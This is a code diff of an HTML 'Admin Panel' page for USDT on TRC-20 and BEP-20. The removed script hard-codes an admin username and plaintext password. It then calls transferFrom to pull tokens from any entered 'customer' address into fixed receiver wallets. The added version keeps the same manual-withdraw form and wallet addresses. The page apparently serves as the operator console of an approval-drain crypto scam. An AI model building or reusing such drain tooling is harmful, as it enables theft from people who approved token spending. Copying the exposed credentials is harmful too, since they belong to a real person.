@@ -1,143 +1,33 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Admin Panel</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #111;
-      color: #fff;
-      padding: 30px;
-    }
-    .login, .panel {
-      max-width: 400px;
-      margin: auto;
-      background: #222;
-      padding: 20px;
-      border-radius: 8px;
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      background: #333;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-    }
-    .hidden {
-      display: none;
-    }
-  </style>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+  <title>Admin Panel - Project A</title>
+  <link rel="stylesheet" href="admin.css">
 </head>
 <body>
+  <h1>Admin Panel - Project A</h1>
 
-  <div class="login" id="loginForm">
-    <h2>Admin Login</h2>
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="login()">Login</button>
+  <div id="balances">
+    <h2>Live USDT Balances</h2>
+    <p>TRC-20 Wallet:<br><b>TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN</b><br>Balance: <span id="trcBalance">Loading...</span></p>
+    <p>BEP-20 Wallet:<br><b>0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E</b><br>Balance: <span id="bepBalance">Loading...</span></p>
   </div>
 
-  <div class="panel hidden" id="adminPanel">
-    <h2>Admin Panel</h2>
-
-    <h4>Real-Time Balances</h4>
-    <p>🔷 TRC-20 Balance: <span id="trcBalance">Loading...</span> USDT</p>
-    <p>🟠 BEP-20 Balance: <span id="bepBalance">Loading...</span> USDT</p>
-
-    <hr>
-
-    <h4>Manual Withdraw</h4>
-    <input type="text" id="fromAddress" placeholder="Customer Address">
+  <div id="withdraw">
+    <h2>Manual Withdraw</h2>
+    <input type="text" id="fromAddress" placeholder="User wallet address">
     <input type="number" id="amount" placeholder="Amount in USDT">
-    <button onclick="withdrawTRC()">Withdraw TRC-20</button>
-    <button onclick="withdrawBEP()">Withdraw BEP-20</button>
+    <button onclick="withdrawTRC20()">Withdraw TRC-20</button>
+    <button onclick="withdrawBEP20()">Withdraw BEP-20</button>
+    <p id="withdrawStatus"></p>
   </div>
 
-  <script>
-    const ADMIN_USER = "enre.atul";
-    const ADMIN_PASS = "Honda988701@";
+  <div id="logs">
+    <h2>Interaction Logs</h2>
+    <ul id="logList"></ul>
+  </div>
 
-    const TRC20_USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
-    const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";
-    const RECEIVER_TRC = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
-    const RECEIVER_BEP = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
-
-    const ABI = [
-      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "sender", "type": "address" }, { "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
-      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
-    ];
-
-    function login() {
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
-      if (user === ADMIN_USER && pass === ADMIN_PASS) {
-        document.getElementById("loginForm").classList.add("hidden");
-        document.getElementById("adminPanel").classList.remove("hidden");
-        fetchBalances();
-      } else {
-        alert("Incorrect credentials!");
-      }
-    }
-
-    async function fetchBalances() {
-      // TRC-20
-      try {
-        const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-        const contract = await tronWeb.contract(ABI, TRC20_USDT);
-        const balance = await contract.methods.balanceOf(RECEIVER_TRC).call();
-        document.getElementById("trcBalance").innerText = (balance / 1e6).toFixed(2);
-      } catch {
-        document.getElementById("trcBalance").innerText = "Error";
-      }
-
-      // BEP-20
-      try {
-        const web3 = new Web3('https://bsc-dataseed.binance.org');
-        const contract = new web3.eth.Contract(ABI, BEP20_USDT);
-        const balance = await contract.methods.balanceOf(RECEIVER_BEP).call();
-        document.getElementById("bepBalance").innerText = (balance / 1e18).toFixed(2);
-      } catch {
-        document.getElementById("bepBalance").innerText = "Error";
-      }
-    }
-
-    async function withdrawTRC() {
-      const from = document.getElementById("fromAddress").value;
-      const amount = document.getElementById("amount").value;
-      if (!from || !amount) return alert("Enter all fields.");
-
-      try {
-        const tronWeb = window.tronWeb;
-        const contract = await tronWeb.contract(ABI, TRC20_USDT);
-        await contract.methods.transferFrom(from, RECEIVER_TRC, tronWeb.toSun(amount)).send();
-        alert("TRC-20 USDT manually withdrawn!");
-      } catch (e) {
-        alert("TRC Withdraw Error: " + e.message);
-      }
-    }
-
-    async function withdrawBEP() {
-      const from = document.getElementById("fromAddress").value;
-      const amount = document.getElementById("amount").value;
-      if (!from || !amount) return alert("Enter all fields.");
-
-      try {
-        const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const contract = new web3.eth.Contract(ABI, BEP20_USDT);
-        await contract.methods.transferFrom(from, RECEIVER_BEP, web3.utils.toWei(amount)).send({ from: (await web3.eth.getAccounts())[0] });
-        alert("BEP-20 USDT manually withdrawn!");
-      } catch (e) {
-        alert("BEP Withdraw Error: " + e.message);
-      }
-    }
-  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="admin.js"></script>
 </body>
 </html>
